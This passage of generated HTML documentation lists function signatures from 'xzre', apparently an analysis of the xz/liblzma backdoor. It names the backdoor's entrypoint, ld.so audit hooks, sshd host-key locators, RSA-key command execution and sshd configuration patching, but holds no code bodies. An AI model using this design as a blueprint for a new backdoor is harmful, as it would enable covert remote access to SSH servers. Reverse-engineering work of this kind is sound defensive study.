<tr class="memdesc:a0d70747b6216270de07c783fc499938e"><td class="mdescLeft">&#160;</td><td class="mdescRight">parses the libc ELF from the supplied link map, and resolves its imports  <a href="xzre_8h.html#a0d70747b6216270de07c783fc499938e">More...</a><br /></td></tr>
<tr class="separator:a0d70747b6216270de07c783fc499938e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1cb8bb283baa56567d7b88b5fcfe7db7"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a1cb8bb283baa56567d7b88b5fcfe7db7">process_shared_libraries</a> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a> *data)</td></tr>
<tr class="memdesc:a1cb8bb283baa56567d7b88b5fcfe7db7"><td class="mdescLeft">&#160;</td><td class="mdescRight">scans loaded libraries to identify interesting libraries  <a href="xzre_8h.html#a1cb8bb283baa56567d7b88b5fcfe7db7">More...</a><br /></td></tr>
<tr class="separator:a1cb8bb283baa56567d7b88b5fcfe7db7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1fcba1b3d069ccf76ee3cef4a3b9a682"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a1fcba1b3d069ccf76ee3cef4a3b9a682">process_shared_libraries_map</a> (struct link_map *r_map, <a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a> *data)</td></tr>
<tr class="memdesc:a1fcba1b3d069ccf76ee3cef4a3b9a682"><td class="mdescLeft">&#160;</td><td class="mdescRight">scans loaded libraries to identify interesting libraries and populate related data  <a href="xzre_8h.html#a1fcba1b3d069ccf76ee3cef4a3b9a682">More...</a><br /></td></tr>
<tr class="separator:a1fcba1b3d069ccf76ee3cef4a3b9a682"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8eb41e1828a73dd4ce8f82a0d42dceb5"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8eb41e1828a73dd4ce8f82a0d42dceb5">chacha_decrypt</a> (u8 *in, int inl, u8 *key, u8 *iv, u8 *out, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *funcs)</td></tr>
<tr class="memdesc:a8eb41e1828a73dd4ce8f82a0d42dceb5"><td class="mdescLeft">&#160;</td><td class="mdescRight">decrypts a buffer with chacha20  <a href="xzre_8h.html#a8eb41e1828a73dd4ce8f82a0d42dceb5">More...</a><br /></td></tr>
<tr class="separator:a8eb41e1828a73dd4ce8f82a0d42dceb5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a80592f231ad06e5a8ba204e6ff685827"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a80592f231ad06e5a8ba204e6ff685827">secret_data_get_decrypted</a> (u8 *output, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a80592f231ad06e5a8ba204e6ff685827"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a decrypted copy of the secret data  <a href="xzre_8h.html#a80592f231ad06e5a8ba204e6ff685827">More...</a><br /></td></tr>
<tr class="separator:a80592f231ad06e5a8ba204e6ff685827"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5d94ba8c95f0333dc53ef8432156b0ca"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a5d94ba8c95f0333dc53ef8432156b0ca">is_range_mapped</a> (u8 *addr, u64 length, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a5d94ba8c95f0333dc53ef8432156b0ca"><td class="mdescLeft">&#160;</td><td class="mdescRight">verify if a memory range is mapped  <a href="xzre_8h.html#a5d94ba8c95f0333dc53ef8432156b0ca">More...</a><br /></td></tr>
<tr class="separator:a5d94ba8c95f0333dc53ef8432156b0ca"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9ec1df74592643b26839ecbe320d36ae"><td class="memItemLeft" align="right" valign="top">u32&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a9ec1df74592643b26839ecbe320d36ae">count_bits</a> (u64 x)</td></tr>
<tr class="memdesc:a9ec1df74592643b26839ecbe320d36ae"><td class="mdescLeft">&#160;</td><td class="mdescRight">returns the number of 1 bits in x  <a href="xzre_8h.html#a9ec1df74592643b26839ecbe320d36ae">More...</a><br /></td></tr>
<tr class="separator:a9ec1df74592643b26839ecbe320d36ae"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6189320317764e3344934873b58b30b1"><td class="memItemLeft" align="right" valign="top">EncodedStringId&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6189320317764e3344934873b58b30b1">get_string_id</a> (const char *string_begin, const char *string_end)</td></tr>
<tr class="memdesc:a6189320317764e3344934873b58b30b1"><td class="mdescLeft">&#160;</td><td class="mdescRight">Get the.  <a href="xzre_8h.html#a6189320317764e3344934873b58b30b1">More...</a><br /></td></tr>
<tr class="separator:a6189320317764e3344934873b58b30b1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a954b1d109f7b7576c4d904a1ef5de2c9"><td class="memItemLeft" align="right" valign="top">unsigned int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a954b1d109f7b7576c4d904a1ef5de2c9">_get_cpuid_modified</a> (unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame)</td></tr>
<tr class="memdesc:a954b1d109f7b7576c4d904a1ef5de2c9"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64()  <a href="xzre_8h.html#a954b1d109f7b7576c4d904a1ef5de2c9">More...</a><br /></td></tr>
<tr class="separator:a954b1d109f7b7576c4d904a1ef5de2c9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a93ca9203c23a4ab6b11ad972e77d6d80"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a93ca9203c23a4ab6b11ad972e77d6d80">_cpuid_gcc</a> (unsigned int level, unsigned int *a, unsigned int *b, unsigned int *c, unsigned int *d)</td></tr>
<tr class="memdesc:a93ca9203c23a4ab6b11ad972e77d6d80"><td class="mdescLeft">&#160;</td><td class="mdescRight">actually calls cpuid instruction  <a href="xzre_8h.html#a93ca9203c23a4ab6b11ad972e77d6d80">More...</a><br /></td></tr>
<tr class="separator:a93ca9203c23a4ab6b11ad972e77d6d80"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3f711254180a966269aec059d386052a"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3f711254180a966269aec059d386052a">init_hooks_ctx</a> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a> *ctx)</td></tr>
<tr class="memdesc:a3f711254180a966269aec059d386052a"><td class="mdescLeft">&#160;</td><td class="mdescRight">Initializes the structure with hooks-related data.  <a href="xzre_8h.html#a3f711254180a966269aec059d386052a">More...</a><br /></td></tr>
<tr class="separator:a3f711254180a966269aec059d386052a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae45d2d9d01681263087d07c9b4de1afd"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae45d2d9d01681263087d07c9b4de1afd">init_shared_globals</a> (<a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals_t</a> *shared_globals)</td></tr>
<tr class="memdesc:ae45d2d9d01681263087d07c9b4de1afd"><td class="mdescLeft">&#160;</td><td class="mdescRight">Initializes the <a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals</a> structure.  <a href="xzre_8h.html#ae45d2d9d01681263087d07c9b4de1afd">More...</a><br /></td></tr>
<tr class="separator:ae45d2d9d01681263087d07c9b4de1afd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a32140b1406c3e4519d5c7e1708ac9ea4"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a32140b1406c3e4519d5c7e1708ac9ea4">init_imported_funcs</a> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a32140b1406c3e4519d5c7e1708ac9ea4"><td class="mdescLeft">&#160;</td><td class="mdescRight">Initializes the <a class="el" href="structimported__funcs.html">imported_funcs</a> structure.  <a href="xzre_8h.html#a32140b1406c3e4519d5c7e1708ac9ea4">More...</a><br /></td></tr>
<tr class="separator:a32140b1406c3e4519d5c7e1708ac9ea4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad3a61f27a1663eb3e0b25b861c85fe3c"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c">update_got_address</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *entry_ctx)</td></tr>
<tr class="memdesc:ad3a61f27a1663eb3e0b25b861c85fe3c"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds the __tls_get_addr() GOT entry  <a href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c">More...</a><br /></td></tr>
<tr class="separator:ad3a61f27a1663eb3e0b25b861c85fe3c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae20580c7a069afb3b578f060582867df"><td class="memItemLeft" align="right" valign="top">ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df">get_tls_get_addr_random_symbol_got_offset</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx)</td></tr>
<tr class="memdesc:ae20580c7a069afb3b578f060582867df"><td class="mdescLeft">&#160;</td><td class="mdescRight">get the tls_get_addr_random_symbol GOT offset  <a href="xzre_8h.html#ae20580c7a069afb3b578f060582867df">More...</a><br /></td></tr>
<tr class="separator:ae20580c7a069afb3b578f060582867df"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0cbdcbe6fe49e7d3122630082cd84f34"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a0cbdcbe6fe49e7d3122630082cd84f34">dummy_tls_get_addr</a> (<a class="el" href="structdl__tls__index.html">tls_index</a> *ti)</td></tr>
<tr class="memdesc:a0cbdcbe6fe49e7d3122630082cd84f34"><td class="mdescLeft">&#160;</td><td class="mdescRight">a dummy function that calls __tls_get_addr, to make sure its GOT slot doesn't get removed by compiler optimizations  <a href="xzre_8h.html#a0cbdcbe6fe49e7d3122630082cd84f34">More...</a><br /></td></tr>
<tr class="separator:a0cbdcbe6fe49e7d3122630082cd84f34"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a60ba9b591b9f0b10a78ea2136a0a3adc"><td class="memItemLeft" align="right" valign="top">uintptr_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc">backdoor_symbind64</a> (Elf64_Sym *sym, unsigned int ndx, uptr *refcook, uptr *defcook, unsigned int flags, const char *symname)</td></tr>
<tr class="memdesc:a60ba9b591b9f0b10a78ea2136a0a3adc"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoored symbind64 installed in GLRO(dl_audit)  <a href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc">More...</a><br /></td></tr>
<tr class="separator:a60ba9b591b9f0b10a78ea2136a0a3adc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:add930f2364d6ac0711ec484781f00f03"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#add930f2364d6ac0711ec484781f00f03">run_backdoor_commands</a> (RSA *key, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx, BOOL *do_orig)</td></tr>
<tr class="memdesc:add930f2364d6ac0711ec484781f00f03"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if the supplied RSA public key contains the backdoor commands, and executes them if present.  <a href="xzre_8h.html#add930f2364d6ac0711ec484781f00f03">More...</a><br /></td></tr>
<tr class="separator:add930f2364d6ac0711ec484781f00f03"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8847a8cb7f015796a8fbd59cb7a18248"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8847a8cb7f015796a8fbd59cb7a18248">find_dl_audit_offsets</a> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *data, ptrdiff_t *libname_offset, <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *hooks, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a8847a8cb7f015796a8fbd59cb7a18248"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find the various offsets in ld.so that need modification to trigger _dl_audit_symbind_alt() to call <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a>.  <a href="xzre_8h.html#a8847a8cb7f015796a8fbd59cb7a18248">More...</a><br /></td></tr>
<tr class="separator:a8847a8cb7f015796a8fbd59cb7a18248"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a17824cde912b4de5dd68530dcbf9d42c"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a17824cde912b4de5dd68530dcbf9d42c">find_link_map_l_name</a> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *data_handle, ptrdiff_t *libname_offset, <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *hooks, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a17824cde912b4de5dd68530dcbf9d42c"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find struct link_map offsets required to modify ld.so's private struct auditstate state.  <a href="xzre_8h.html#a17824cde912b4de5dd68530dcbf9d42c">More...</a><br /></td></tr>
<tr class="separator:a17824cde912b4de5dd68530dcbf9d42c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a18543737f1eaf3cb1288d0c57c1f0a65"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a18543737f1eaf3cb1288d0c57c1f0a65">find_dl_naudit</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *dynamic_linker_elf, <a class="el" href="structelf__info.html">elf_info_t</a> *libcrypto_elf, <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *hooks, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a18543737f1eaf3cb1288d0c57c1f0a65"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find __rtld_global_ro offsets required to modify ld.so's private struct <a class="el" href="structaudit__ifaces.html">audit_ifaces</a> state.  <a href="xzre_8h.html#a18543737f1eaf3cb1288d0c57c1f0a65">More...</a><br /></td></tr>
<tr class="separator:a18543737f1eaf3cb1288d0c57c1f0a65"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2d980185c135b2dd9bc69c099ba60c25"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a2d980185c135b2dd9bc69c099ba60c25">find_link_map_l_audit_any_plt</a> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *data, ptrdiff_t libname_offset, <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *hooks, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a2d980185c135b2dd9bc69c099ba60c25"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find struct link_map offset required to modify ld.so's private link_map::l_audit_any_plt state.  <a href="xzre_8h.html#a2d980185c135b2dd9bc69c099ba60c25">More...</a><br /></td></tr>
<tr class="separator:a2d980185c135b2dd9bc69c099ba60c25"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a82817ae0ac4e7e9a7ded04c0fa16ed9c"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a82817ae0ac4e7e9a7ded04c0fa16ed9c">find_link_map_l_audit_any_plt_bitmask</a> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *data, <a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a> *search_ctx)</td></tr>
<tr class="memdesc:a82817ae0ac4e7e9a7ded04c0fa16ed9c"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find the bitmask required to modify ld.so's private link_map::l_audit_any_plt state.  <a href="xzre_8h.html#a82817ae0ac4e7e9a7ded04c0fa16ed9c">More...</a><br /></td></tr>
<tr class="separator:a82817ae0ac4e7e9a7ded04c0fa16ed9c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae0bd1e83c94cd866e022dd5867bee152"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae0bd1e83c94cd866e022dd5867bee152">sshd_get_sensitive_data_address_via_xcalloc</a> (u8 *data_start, u8 *data_end, u8 *code_start, u8 *code_end, <a class="el" href="structstring__references.html">string_references_t</a> *string_refs, void **sensitive_data_out)</td></tr>
<tr class="memdesc:ae0bd1e83c94cd866e022dd5867bee152"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds the address of <code>sensitive_data.host_keys</code> in sshd by using XREF_xcalloc_zero_size in <code>xcalloc</code>  <a href="xzre_8h.html#ae0bd1e83c94cd866e022dd5867bee152">More...</a><br /></td></tr>
<tr class="separator:ae0bd1e83c94cd866e022dd5867bee152"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a75dff765c216d52b153ba98cf7cf0227"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a75dff765c216d52b153ba98cf7cf0227">sshd_get_sensitive_data_address_via_krb5ccname</a> (u8 *data_start, u8 *data_end, u8 *code_start, u8 *code_end, void **sensitive_data_out, <a class="el" href="structelf__info.html">elf_info_t</a> *elf)</td></tr>
<tr class="memdesc:a75dff765c216d52b153ba98cf7cf0227"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds the address of <code>sensitive_data.host_keys</code> in sshd by using getenv( STR_KRB5CCNAME )  <a href="xzre_8h.html#a75dff765c216d52b153ba98cf7cf0227">More...</a><br /></td></tr>
<tr class="separator:a75dff765c216d52b153ba98cf7cf0227"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8320540fc87f4c785714c52940a85571"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8320540fc87f4c785714c52940a85571">sshd_get_sensitive_data_score_in_demote_sensitive_data</a> (void *<a class="el" href="structsensitive__data.html">sensitive_data</a>, <a class="el" href="structelf__info.html">elf_info_t</a> *elf, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:a8320540fc87f4c785714c52940a85571"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a numeric score which indicates if <code>demote_sensitive_data</code> accesses <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> or not  <a href="xzre_8h.html#a8320540fc87f4c785714c52940a85571">More...</a><br /></td></tr>
<tr class="separator:a8320540fc87f4c785714c52940a85571"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa83cef3858c167b051721db9fbd72667"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aa83cef3858c167b051721db9fbd72667">sshd_get_sensitive_data_score_in_main</a> (void *<a class="el" href="structsensitive__data.html">sensitive_data</a>, <a class="el" href="structelf__info.html">elf_info_t</a> *elf, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:aa83cef3858c167b051721db9fbd72667"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a numeric score which indicates if <code>main</code> accesses <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> or not  <a href="xzre_8h.html#aa83cef3858c167b051721db9fbd72667">More...</a><br /></td></tr>
<tr class="separator:aa83cef3858c167b051721db9fbd72667"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5f78359c3bb3564a965009ee2280ac5a"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a5f78359c3bb3564a965009ee2280ac5a">sshd_get_sensitive_data_score_in_do_child</a> (void *<a class="el" href="structsensitive__data.html">sensitive_data</a>, <a class="el" href="structelf__info.html">elf_info_t</a> *elf, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:a5f78359c3bb3564a965009ee2280ac5a"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a numeric score which indicates if <code>do_child</code> accesses <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> or not  <a href="xzre_8h.html#a5f78359c3bb3564a965009ee2280ac5a">More...</a><br /></td></tr>
<tr class="separator:a5f78359c3bb3564a965009ee2280ac5a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7d1ef087d8cb5ea0a468fc42bb503049"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a7d1ef087d8cb5ea0a468fc42bb503049">sshd_get_sensitive_data_score</a> (void *<a class="el" href="structsensitive__data.html">sensitive_data</a>, <a class="el" href="structelf__info.html">elf_info_t</a> *elf, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:a7d1ef087d8cb5ea0a468fc42bb503049"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a numeric score which indicates if accesses <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> or not  <a href="xzre_8h.html#a7d1ef087d8cb5ea0a468fc42bb503049">More...</a><br /></td></tr>
<tr class="separator:a7d1ef087d8cb5ea0a468fc42bb503049"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a966b189602e0af0053053e8405d39fa2"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a966b189602e0af0053053e8405d39fa2">bignum_serialize</a> (u8 *buffer, u64 bufferSize, u64 *pOutSize, const BIGNUM *bn, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *funcs)</td></tr>
<tr class="memdesc:a966b189602e0af0053053e8405d39fa2"><td class="mdescLeft">&#160;</td><td class="mdescRight">Serializes the BIGNUM <code>bn</code> to the buffer <code>buffer</code>.  <a href="xzre_8h.html#a966b189602e0af0053053e8405d39fa2">More...</a><br /></td></tr>
<tr class="separator:a966b189602e0af0053053e8405d39fa2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae4488f858b97dc690b41cf9a5d20ef44"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae4488f858b97dc690b41cf9a5d20ef44">sshbuf_bignum_is_negative</a> (struct sshbuf *buf)</td></tr>
<tr class="memdesc:ae4488f858b97dc690b41cf9a5d20ef44"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if the given serialized BIGNUM is negative  <a href="xzre_8h.html#ae4488f858b97dc690b41cf9a5d20ef44">More...</a><br /></td></tr>
<tr class="separator:ae4488f858b97dc690b41cf9a5d20ef44"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a642b0366b943daba60d004a6a46fb7c7"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a642b0366b943daba60d004a6a46fb7c7">rsa_key_hash</a> (const RSA *rsa, u8 *mdBuf, u64 mdBufSize, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *funcs)</td></tr>
<tr class="memdesc:a642b0366b943daba60d004a6a46fb7c7"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a SHA256 hash of the supplied RSA key  <a href="xzre_8h.html#a642b0366b943daba60d004a6a46fb7c7">More...</a><br /></td></tr>
<tr class="separator:a642b0366b943daba60d004a6a46fb7c7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1e6926b448d83ad3517bd38a954fe762"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a1e6926b448d83ad3517bd38a954fe762">dsa_key_hash</a> (const DSA *dsa, u8 *mdBuf, u64 mdBufSize, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a1e6926b448d83ad3517bd38a954fe762"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a SHA256 hash of the supplied RSA key  <a href="xzre_8h.html#a1e6926b448d83ad3517bd38a954fe762">More...</a><br /></td></tr>
<tr class="separator:a1e6926b448d83ad3517bd38a954fe762"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3a3417b7999e13c79b9411e092923278"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3a3417b7999e13c79b9411e092923278">sha256</a> (const void *data, size_t count, u8 *mdBuf, u64 mdBufSize, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *funcs)</td></tr>
<tr class="memdesc:a3a3417b7999e13c79b9411e092923278"><td class="mdescLeft">&#160;</td><td class="mdescRight">computes the SHA256 hash of the supplied data  <a href="xzre_8h.html#a3a3417b7999e13c79b9411e092923278">More...</a><br /></td></tr>
<tr class="separator:a3a3417b7999e13c79b9411e092923278"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0b0ce96673cd8ebf4541cff2b20dfe86"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a0b0ce96673cd8ebf4541cff2b20dfe86">verify_signature</a> (struct <a class="el" href="structsshkey.html">sshkey</a> *<a class="el" href="structsshkey.html">sshkey</a>, u8 *signed_data, u64 sshkey_digest_offset, u64 signed_data_size, u8 *signature, u8 *ed448_raw_key, <a class="el" href="structglobal__context.html">global_context_t</a> *global_ctx)</td></tr>
<tr class="memdesc:a0b0ce96673cd8ebf4541cff2b20dfe86"><td class="mdescLeft">&#160;</td><td class="mdescRight">Checks if <code>signed_data</code> is signed with <code>ed448_raw_key</code>.  <a href="xzre_8h.html#a0b0ce96673cd8ebf4541cff2b20dfe86">More...</a><br /></td></tr>
<tr class="separator:a0b0ce96673cd8ebf4541cff2b20dfe86"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a938289ac36ce7b17b60a4f5c0c28d2d4"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a938289ac36ce7b17b60a4f5c0c28d2d4">sshd_patch_variables</a> (BOOL skip_root_patch, BOOL disable_pam, BOOL replace_monitor_reqtype, int monitor_reqtype, <a class="el" href="structglobal__context.html">global_context_t</a> *global_ctx)</td></tr>
<tr class="memdesc:a938289ac36ce7b17b60a4f5c0c28d2d4"><td class="mdescLeft">&#160;</td><td class="mdescRight">Patches the sshd configuration.  <a href="xzre_8h.html#a938289ac36ce7b17b60a4f5c0c28d2d4">More...</a><br /></td></tr>
<tr class="separator:a938289ac36ce7b17b60a4f5c0c28d2d4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad32fc521229739df889407c2e9e48475"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad32fc521229739df889407c2e9e48475">sshd_find_monitor_struct</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *elf, <a class="el" href="structstring__references.html">string_references_t</a> *refs, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
